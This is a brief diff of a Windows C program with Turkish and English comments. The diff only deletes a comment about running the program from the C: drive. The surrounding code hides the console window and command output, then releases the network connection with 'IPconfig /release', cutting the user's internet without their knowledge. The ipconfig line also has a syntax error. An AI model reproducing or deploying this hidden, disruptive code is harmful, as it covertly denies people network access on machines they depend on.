@@ -3,7 +3,6 @@
 #include <windows.h>
 
 int main() {
-   //tr:C: sürücüsünde çalıştırın en:Run at C: driver
    FreeConsole();  //tr:Konsolu gizler en:Hides console
    system("@echo off"); //tr:Komut çıktısını gizler en:Hides command output
    system("IPconfig /release"): //tr:İnterneti kapatır en:Closes internet
